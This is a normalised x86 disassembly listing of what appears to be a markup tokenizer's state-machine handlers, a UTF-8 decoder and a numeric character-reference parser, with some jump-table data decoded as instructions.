call sub_100791e0
mov edx [ esi + 0x8 ]
add esp 0x4
mov [ edx ] 0x42
mov [ edi + 0x88 ] 0x1
pop edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov [ ecx ] 0x3d
mov [ edi + 0x4 ] 0x1
pop edi
mov eax 0x2
pop esi
pop ebp
retn
sub_1007d6a8
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add [ ecx ] eax
add eax [ ecx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ecx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ edx ]
int3
sub_1007d6f0
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
inc eax
push esi
cmp eax 0x3f
ja r-xdata
mov esi [ ebp + 0x8 ]
push 0x23
mov eax esi
call sub_100791e0
mov eax [ esi + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ eax ] 0x42
mov eax [ ebp + 0x14 ]
add esp 0x4
mov [ ecx + 0x88 ] 0x1
call sub_10079630
xor eax eax
pop esi
pop ebp
retn
movzx eax [ eax + lookup_table_1007d814 ]
jmp [ eax * 4 + jump_table_1007d7fc ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x8 ]
mov [ edx ] 0x38
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x23
mov eax esi
call sub_100791e0
mov eax [ esi + 0x8 ]
add esp 0x4
mov [ eax ] 0x39
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x23
mov eax esi
call sub_100791e0
mov ecx [ esi + 0x8 ]
add esp 0x4
mov [ ecx ] 0x3a
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x25
mov eax esi
call sub_100791e0
mov edx [ esi + 0x8 ]
mov eax [ ebp + 0xc ]
mov [ edx ] 0x0
mov [ eax + 0x88 ] 0x1
mov eax [ ebp + 0x14 ]
add esp 0x4
call sub_10079630
xor eax eax
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x22
mov eax esi
call sub_100791e0
mov ecx [ esi + 0x8 ]
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x14 ]
mov [ ecx ] 0x0
add esp 0x4
mov [ edx + 0x88 ] 0x1
call sub_10079630
xor eax eax
pop esi
pop ebp
retn
sub_1007d81a
add eax 0x1050505
add [ 0x5050501 ] eax
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5020501
add eax 0x5030505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0xcccccc04
int3
sub_1007d860
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
inc eax
push esi
cmp eax 0x3f
ja r-xdata
mov esi [ ebp + 0x8 ]
push 0x23
mov eax esi
call sub_100791e0
mov eax [ esi + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ eax ] 0x42
mov eax [ ebp + 0x14 ]
add esp 0x4
mov [ ecx + 0x88 ] 0x1
call sub_10079630
xor eax eax
pop esi
pop ebp
retn
movzx eax [ eax + lookup_table_1007d960 ]
jmp [ eax * 4 + jump_table_1007d948 ]
mov eax 0x2
pop esi
pop ebp
retn
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x8 ]
mov [ edx ] 0x39
mov eax 0x2
pop esi
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov [ ecx ] 0x3a
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x27
mov eax esi
call sub_100791e0
mov edx [ esi + 0x8 ]
mov eax [ ebp + 0xc ]
mov [ edx ] 0x0
mov [ eax + 0x88 ] 0x1
mov eax [ ebp + 0x14 ]
add esp 0x4
call sub_10079630
xor eax eax
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x22
mov eax esi
call sub_100791e0
mov ecx [ esi + 0x8 ]
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x14 ]
mov [ ecx ] 0x0
add esp 0x4
mov [ edx + 0x88 ] 0x1
call sub_10079630
xor eax eax
pop esi
pop ebp
retn
sub_1007d966
add eax 0x1050505
add [ 0x5050501 ] eax
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5020501
add eax 0x5030505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0xec8b5504
mov ecx [ ebp + 0x10 ]
lea eax [ ecx + 0x1 ]
push esi
cmp eax 0x3f
ja r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0x8 ]
add edx 0x10
push edx
push ecx
push eax
call sub_1005ada0
add esp 0xc
mov eax 0x2
pop esi
pop ebp
retn
movzx eax [ eax + lookup_table_1007daa4 ]
jmp [ eax * 4 + jump_table_1007da90 ]
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x8 ]
mov [ ecx ] 0x3b
call sub_10079490
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x2
mov eax esi
call sub_100791e0
mov edx [ esi + 0x8 ]
mov eax [ r--data ]
add edx 0x10
push edx
push eax
push esi
call sub_1005ada0
add esp 0x10
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x27
mov eax esi
call sub_100791e0
mov ecx [ esi + 0x8 ]
mov edx [ ebp + 0xc ]
mov [ ecx ] 0x0
add esp 0x4
mov [ edx + 0x88 ] 0x1
call sub_10079490
mov eax [ ebp + 0x14 ]
call sub_10079630
xor eax eax
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x22
mov eax esi
call sub_100791e0
mov eax [ esi + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ eax ] 0x0
add esp 0x4
mov [ ecx + 0x88 ] 0x1
call sub_10079490
mov eax [ ebp + 0x14 ]
call sub_10079630
xor eax eax
pop esi
pop ebp
retn
sub_1007daa9
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al [ esp + eax ]
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x3
int3
sub_1007daf0
push ebp
mov ebp esp
mov ecx [ ebp + 0x10 ]
lea eax [ ecx + 0x1 ]
push esi
cmp eax 0x3f
ja r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0x8 ]
add edx 0x10
push edx
push ecx
push eax
call sub_1005ada0
add esp 0xc
mov eax 0x2
pop esi
pop ebp
retn
movzx eax [ eax + lookup_table_1007dbf4 ]
jmp [ eax * 4 + jump_table_1007dbe0 ]
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x8 ]
mov [ ecx ] 0x3b
call sub_10079490
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x2
mov eax esi
call sub_100791e0
mov edx [ esi + 0x8 ]
mov eax [ r--data ]
add edx 0x10
push edx
push eax
push esi
call sub_1005ada0
add esp 0x10
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x27
mov eax esi
call sub_100791e0
mov ecx [ esi + 0x8 ]
mov edx [ ebp + 0xc ]
mov [ ecx ] 0x0
add esp 0x4
mov [ edx + 0x88 ] 0x1
call sub_10079490
mov eax [ ebp + 0x14 ]
call sub_10079630
xor eax eax
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x22
mov eax esi
call sub_100791e0
mov eax [ esi + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ eax ] 0x0
add esp 0x4
mov [ ecx + 0x88 ] 0x1
call sub_10079490
mov eax [ ebp + 0x14 ]
call sub_10079630
xor eax eax
pop esi
pop ebp
retn
sub_1007dbf9
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x2
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add ecx esp
int3
sub_1007dc40
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
inc eax
push esi
cmp eax 0x3f
ja r-xdata
mov esi [ ebp + 0x8 ]
push 0x23
mov eax esi
call sub_100791e0
mov ecx [ esi + 0x8 ]
mov edx [ ebp + 0xc ]
add esp 0x4
mov [ ecx ] 0x42
mov [ edx + 0x88 ] 0x1
mov eax 0x2
pop esi
pop ebp
retn
movzx eax [ eax + lookup_table_1007dd44 ]
jmp [ eax * 4 + jump_table_1007dd2c ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x8 ]
mov [ edx ] 0x3c
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0x8 ]
mov [ eax ] 0x0
mov eax [ ebp + 0x14 ]
call sub_10079630
mov eax 0x1
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x23
mov eax esi
call sub_100791e0
mov ecx [ esi + 0x8 ]
add esp 0x4
mov [ ecx ] 0x3f
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x23
mov eax esi
call sub_100791e0
mov edx [ esi + 0x8 ]
add esp 0x4
mov [ edx ] 0x40
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x22
mov eax esi
call sub_100791e0
mov eax [ esi + 0x8 ]
mov [ eax ] 0x0
mov eax [ ebp + 0xc ]
mov ecx 0x1
add esp 0x4
mov [ eax + 0x4 ] ecx
mov [ eax + 0x88 ] ecx
lea eax [ ecx + 0x1 ]
pop esi
pop ebp
retn
sub_1007dd4a
add eax 0x1050505
add [ 0x5050501 ] eax
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5020501
add eax 0x5030505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0xcccccc04
int3
sub_1007dd90
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
inc eax
push esi
cmp eax 0x3f
ja r-xdata
mov esi [ ebp + 0x8 ]
push 0x23
mov eax esi
call sub_100791e0
mov edx [ esi + 0x8 ]
mov eax [ ebp + 0xc ]
mov [ edx ] 0x42
mov [ eax + 0x88 ] 0x1
mov eax [ ebp + 0x14 ]
add esp 0x4
call sub_10079630
xor eax eax
pop esi
pop ebp
retn
movzx eax [ eax + lookup_table_1007de78 ]
jmp [ eax * 4 + jump_table_1007de60 ]
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x8 ]
mov eax [ ebp + 0x14 ]
mov [ ecx ] 0x0
call sub_10079630
mov eax 0x1
pop esi
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
mov [ eax ] 0x3f
mov eax 0x2
pop esi
pop ebp
retn
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x8 ]
mov [ edx ] 0x40
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x22
mov eax esi
call sub_100791e0
mov eax [ esi + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ eax ] 0x0
mov eax [ ebp + 0x14 ]
add esp 0x4
mov [ ecx + 0x88 ] 0x1
call sub_10079630
xor eax eax
pop esi
pop ebp
retn
sub_1007de7e
add eax 0x1050505
add [ 0x5050501 ] eax
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5020501
add eax 0x5030505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0xcccccc04
int3
sub_1007dec0
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
inc eax
push esi
cmp eax 0x3f
ja r-xdata
mov esi [ ebp + 0x8 ]
push 0x23
mov eax esi
call sub_100791e0
mov eax [ esi + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ eax ] 0x42
add esp 0x4
mov [ ecx + 0x88 ] 0x1
mov eax 0x2
pop esi
pop ebp
retn
movzx eax [ eax + lookup_table_1007dfdc ]
jmp [ eax * 4 + jump_table_1007dfc4 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x8 ]
mov [ edx ] 0x3e
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x23
mov eax esi
call sub_100791e0
mov eax [ esi + 0x8 ]
add esp 0x4
mov [ eax ] 0x3f
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x23
mov eax esi
call sub_100791e0
mov ecx [ esi + 0x8 ]
add esp 0x4
mov [ ecx ] 0x40
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x27
mov eax esi
call sub_100791e0
mov edx [ esi + 0x8 ]
mov eax [ ebp + 0xc ]
mov [ edx ] 0x0
mov [ eax + 0x88 ] 0x1
mov eax [ ebp + 0x14 ]
add esp 0x4
call sub_10079630
xor eax eax
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x22
mov eax esi
call sub_100791e0
mov ecx [ esi + 0x8 ]
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x14 ]
mov [ ecx ] 0x0
add esp 0x4
mov [ edx + 0x88 ] 0x1
call sub_10079630
xor eax eax
pop esi
pop ebp
retn
sub_1007dfe2
add eax 0x1050505
add [ 0x5050501 ] eax
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5020501
add eax 0x5030505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0xcccccc04
int3
sub_1007e020
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
inc eax
push esi
cmp eax 0x3f
ja r-xdata
mov esi [ ebp + 0x8 ]
push 0x23
mov eax esi
call sub_100791e0
mov eax [ esi + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ eax ] 0x42
add esp 0x4
mov [ ecx + 0x88 ] 0x1
movzx eax [ eax + lookup_table_1007e110 ]
jmp [ eax * 4 + jump_table_1007e0f8 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x8 ]
mov [ edx ] 0x3f
mov eax 0x2
pop esi
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov [ ecx ] 0x40
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x27
mov eax esi
call sub_100791e0
mov edx [ esi + 0x8 ]
mov eax [ ebp + 0xc ]
mov [ edx ] 0x0
mov [ eax + 0x88 ] 0x1
mov eax [ ebp + 0x14 ]
add esp 0x4
call sub_10079630
xor eax eax
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x22
mov eax esi
call sub_100791e0
mov ecx [ esi + 0x8 ]
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x14 ]
mov [ ecx ] 0x0
add esp 0x4
mov [ edx + 0x88 ] 0x1
call sub_10079630
xor eax eax
pop esi
pop ebp
retn
mov eax 0x2
pop esi
pop ebp
retn
sub_1007e116
add eax 0x1050505
add [ 0x5050501 ] eax
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5020501
add eax 0x5030505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0xec8b5504
mov ecx [ ebp + 0x10 ]
lea eax [ ecx + 0x1 ]
push esi
cmp eax 0x3f
ja r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0x8 ]
add edx 0x10
push edx
push ecx
push eax
call sub_1005ada0
add esp 0xc
mov eax 0x2
pop esi
pop ebp
retn
movzx eax [ eax + lookup_table_1007e254 ]
jmp [ eax * 4 + jump_table_1007e240 ]
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x8 ]
mov [ ecx ] 0x41
call sub_10079500
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x2
mov eax esi
call sub_100791e0
mov edx [ esi + 0x8 ]
mov eax [ r--data ]
add edx 0x10
push edx
push eax
push esi
call sub_1005ada0
add esp 0x10
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x27
mov eax esi
call sub_100791e0
mov ecx [ esi + 0x8 ]
mov edx [ ebp + 0xc ]
mov [ ecx ] 0x0
add esp 0x4
mov [ edx + 0x88 ] 0x1
call sub_10079500
mov eax [ ebp + 0x14 ]
call sub_10079630
xor eax eax
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x22
mov eax esi
call sub_100791e0
mov eax [ esi + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ eax ] 0x0
add esp 0x4
mov [ ecx + 0x88 ] 0x1
call sub_10079500
mov eax [ ebp + 0x14 ]
call sub_10079630
xor eax eax
pop esi
pop ebp
retn
sub_1007e259
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al [ esp + eax ]
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x3
int3
sub_1007e2a0
push ebp
mov ebp esp
mov ecx [ ebp + 0x10 ]
lea eax [ ecx + 0x1 ]
push esi
cmp eax 0x3f
ja r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0x8 ]
add edx 0x10
push edx
push ecx
push eax
call sub_1005ada0
add esp 0xc
mov eax 0x2
pop esi
pop ebp
retn
movzx eax [ eax + lookup_table_1007e3a4 ]
jmp [ eax * 4 + jump_table_1007e390 ]
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x8 ]
mov [ ecx ] 0x41
call sub_10079500
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x2
mov eax esi
call sub_100791e0
mov edx [ esi + 0x8 ]
mov eax [ r--data ]
add edx 0x10
push edx
push eax
push esi
call sub_1005ada0
add esp 0x10
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x27
mov eax esi
call sub_100791e0
mov ecx [ esi + 0x8 ]
mov edx [ ebp + 0xc ]
mov [ ecx ] 0x0
add esp 0x4
mov [ edx + 0x88 ] 0x1
call sub_10079500
mov eax [ ebp + 0x14 ]
call sub_10079630
xor eax eax
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x23
mov eax esi
call sub_100791e0
mov eax [ esi + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ eax ] 0x0
add esp 0x4
mov [ ecx + 0x88 ] 0x1
call sub_10079500
mov eax [ ebp + 0x14 ]
call sub_10079630
xor eax eax
pop esi
pop ebp
retn
sub_1007e3a9
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x2
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add ecx esp
int3
sub_1007e3f0
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
inc eax
push esi
cmp eax 0x3f
ja r-xdata
mov esi [ ebp + 0x8 ]
push 0x23
mov eax esi
call sub_100791e0
mov ecx [ esi + 0x8 ]
add esp 0x4
mov [ ecx ] 0x42
movzx eax [ eax + lookup_table_1007e48c ]
jmp [ eax * 4 + jump_table_1007e47c ]
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x8 ]
mov eax [ ebp + 0x14 ]
mov [ ecx ] 0x0
call sub_10079630
mov eax 0x1
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x22
mov eax esi
call sub_100791e0
mov edx [ esi + 0x8 ]
mov eax [ ebp + 0xc ]
mov [ edx ] 0x0
mov [ eax + 0x88 ] 0x1
mov eax [ ebp + 0x14 ]
add esp 0x4
call sub_10079630
xor eax eax
pop esi
pop ebp
retn
mov eax 0x2
pop esi
pop ebp
retn
sub_1007e490
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add [ ecx ] eax
add eax [ ecx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ecx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ edx ]
int3
sub_1007e4d0
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
cmp eax 0x3e
je r-xdata
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0x8 ]
mov [ eax ] 0x0
mov eax [ ebp + 0x14 ]
call sub_10079630
xor eax eax
pop esi
pop ebp
retn
cmp eax 0xffffffff
je r-xdata
mov eax 0x2
pop ebp
retn
sub_1007e510
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0xffffffff
push esi
mov esi [ ebp + 0xc ]
push edi
je r-xdata
lea edi [ esi + 0x94 ]
push edi
mov [ esi + 0x4 ] 0x1
call sub_1005b7e0
mov [ esi + 0x2c ] eax
add esi 0x30
push esi
push edi
call sub_10012bd0
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
add esp 0xc
pop edi
mov [ eax ] 0x0
mov eax 0x2
pop esi
pop ebp
retn
push 0x1
push 0x3
lea eax [ esi + 0x94 ]
push r--data
push eax
call sub_10034680
add esp 0x10
test eax eax
jne r-xdata
mov edi [ ebp + 0x8 ]
mov ecx [ edi + 0x8 ]
add ecx 0x94
push ecx
call sub_100298f0
mov esi eax
mov eax [ ebp + 0x14 ]
push edi
call sub_10079570
add esp 0x8
pop edi
mov eax 0x1
pop esi
pop ebp
retn
sub_1007e5a0
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
mov edi eax
mov eax [ edi + 0x2c ]
push eax
call sub_10058470
mov esi eax
xor ebx ebx
add esp 0x4
cmp esi ebx
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov [ esi ] eax
mov ecx [ edi + 0x14 ]
mov [ esi + 0x4 ] ecx
mov edx [ edi + 0x18 ]
mov [ esi + 0x8 ] edx
mov eax [ edi + 0x1c ]
mov [ esi + 0xc ] eax
mov ecx [ edi ]
mov [ esi + 0x10 ] ecx
mov eax [ edi + 0x10 ]
xor ecx ecx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] eax
cmp eax ebx
jle r-xdata
mov ecx [ ebp - 0xc ]
mov [ esi + 0x18 ] ebx
mov [ esi + 0x1c ] ecx
mov edx [ edi ]
mov [ ebp - 0x4 ] edx
nop
mov edi [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
movzx eax [ eax + ecx ]
shld edi ebx 0x8
cdq
shl ebx 0x8
or edx edi
inc ecx
or ebx eax
mov [ ebp - 0xc ] edx
cmp ecx [ ebp - 0x8 ]
jl r-xdata
sub_1007e620
push ebp
mov ebp esp
sub esp 0xc
mov ecx [ esi ]
mov al [ ecx ]
push ebx
xor ebx ebx
xor dl dl
push edi
mov [ ebp - 0x4 ] ebx
cmp al 0x80
jae r-xdata
cmp al 0xc0
jb r-xdata
mov [ esi + 0x10 ] 0x1
or dl 0xff
jmp r-xdata
mov ebx 0x1
mov [ esi + 0x10 ] ebx
cmp al 0xe0
jae r-xdata
and al dl
movzx eax al
cdq
mov [ ebp - 0x8 ] edx
mov edx [ esi + 0x10 ]
mov edi eax
mov eax [ esi + 0x8 ]
add edx ecx
cmp edx eax
jbe r-xdata
mov ecx 0x1
cmp [ esi + 0x10 ] ecx
jle r-xdata
sub eax ecx
mov [ esi + 0x10 ] eax
push 0x1
mov eax esi
call sub_1007e5a0
mov ebx 0x1
add esp 0x4
mov [ ebp - 0x4 ] ebx
cmp al 0xf0
jae r-xdata
mov [ esi + 0x10 ] 0x2
mov dl 0x1f
cmp al 0xc2
jae r-xdata
mov ecx [ ebp - 0x8 ]
test ecx ecx
ja r-xdata
jmp r-xdata
cmp al 0xf5
jae r-xdata
mov [ esi + 0x10 ] 0x3
mov dl 0xf
jmp r-xdata
mov ebx 0x1
jmp r-xdata
push 0x0
mov eax esi
call sub_1007e5a0
add esp 0x4
mov eax 0xfffd
pop edi
mov [ ebp - 0x8 ] 0x0
mov [ esi + 0xc ] eax
pop ebx
mov esp ebp
pop ebp
retn
jb r-xdata
mov eax [ esi ]
mov al [ eax + ecx ]
lea edx [ eax + 0x80 ]
cmp dl 0x3f
ja r-xdata
cmp al 0xf8
jae r-xdata
mov [ esi + 0x10 ] 0x4
mov dl 0x7
jmp r-xdata
mov [ ebp - 0x4 ] ebx
test ebx ebx
jne r-xdata
cmp edi 0x10ffff
ja r-xdata
mov [ esi + 0x10 ] ecx
mov ebx 0x1
mov ebx [ ebp - 0x8 ]
movzx eax al
shld ebx edi 0x6
and eax 0xffffff7f
cdq
shl edi 0x6
or edx ebx
inc ecx
or edi eax
mov [ ebp - 0x8 ] edx
cmp ecx [ esi + 0x10 ]
jl r-xdata
cmp al 0xfc
jae r-xdata
mov [ esi + 0x10 ] 0x5
mov ebx 0x1
jmp r-xdata
cmp edi 0x1
jl r-xdata
mov ebx [ ebp - 0x4 ]
jmp r-xdata
cmp al 0xfe
jae r-xdata
mov [ esi + 0x10 ] 0x6
mov ebx 0x1
jmp r-xdata
cmp edi 0xb
je r-xdata
cmp edi 0x8
jle r-xdata
mov [ esi + 0x10 ] 0x7
mov ebx 0x1
jmp r-xdata
cmp edi 0xe
jl r-xdata
cmp edi 0x7f
jl r-xdata
cmp edi 0x1f
jle r-xdata
cmp edi 0xfdd0
jl r-xdata
cmp edi 0x9f
jle r-xdata
mov eax edi
and eax 0xffff
cmp eax 0xfffe
je r-xdata
cmp edi 0xfdef
jle r-xdata
cmp eax 0xffff
jne r-xdata
cmp edi 0xd
jne r-xdata
mov [ esi + 0xc ] edi
pop edi
pop ebx
mov esp ebp
pop ebp
retn
test ecx ecx
jne r-xdata
mov ecx [ esi ]
mov eax [ esi + 0x10 ]
add eax ecx
cmp eax [ esi + 0x8 ]
jae r-xdata
mov eax 0xa
pop edi
mov [ ebp - 0x8 ] 0x0
mov [ esi + 0xc ] eax
pop ebx
mov esp ebp
pop ebp
retn
cmp [ eax ] 0xa
jne r-xdata
inc ecx
inc [ esi + 0x1c ]
mov [ esi ] ecx
sub_1007e800
push ebp
mov ebp esp
push esi
push eax
call sub_10058470
mov esi eax
add esp 0x4
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov ecx [ ebp + 0x8 ]
push esi
push ecx
call sub_10001000
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x10 ]
mov [ esi ] edx
cdq
add esp 0x8
mov [ esi + 0x18 ] eax
mov [ esi + 0x1c ] edx
sub_1007e840
push ebp
mov ebp esp
sub esp 0x8
push esi
push ebx
call sub_1000ac10
xor esi esi
push ebx
mov [ ebp - 0x4 ] esi
call sub_100298f0
add esp 0x8
cmp eax 0x78
je r-xdata
push ebx
mov [ ebp - 0x4 ] 0x1
call sub_1000ac10
push ebx
call sub_100298f0
mov esi [ ebp - 0x4 ]
add esp 0x8
cmp eax 0x58
jne r-xdata
test esi esi
je r-xdata
mov eax ecx
jmp r-xdata
lea ecx [ eax - 0x30 ]
cmp ecx 0x9
ja r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_10058470
mov esi eax
add esp 0x4
test esi esi
je r-xdata
lea ecx [ eax - 0x61 ]
cmp ecx 0x5
ja r-xdata
cmp eax 0xffffffff
jne r-xdata
push ebx
call sub_10047210
mov ecx [ ebp + 0xc ]
add esp 0x4
mov [ ecx ] 0xffffffff
xor eax eax
pop esi
mov esp ebp
pop ebp
retn
push esi
push ebx
call sub_10001000
add esp 0x8
mov [ esi ] 0x3
lea edx [ eax - 0x41 ]
cmp edx 0x5
ja r-xdata
add eax 0xffffffa9
jmp r-xdata
push edi
xor edi edi
neg esi
sbb esi esi
and esi 0x6
mov [ ebp - 0x8 ] 0x1
add esi 0xa
lea ebx [ ebx ]
add eax 0xffffffc9
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax ecx
jmp r-xdata
push ebx
call sub_100298f0
add esp 0x4
cmp eax 0x3b
je r-xdata
lea ecx [ eax - 0x61 ]
cmp ecx 0x5
ja r-xdata
cmp eax 0xffffffff
jne r-xdata
push ebx
call sub_1000ac10
add esp 0x4
mov eax [ ebp + 0x8 ]
push eax
call sub_10058470
mov esi eax
add esp 0x4
test esi esi
je r-xdata
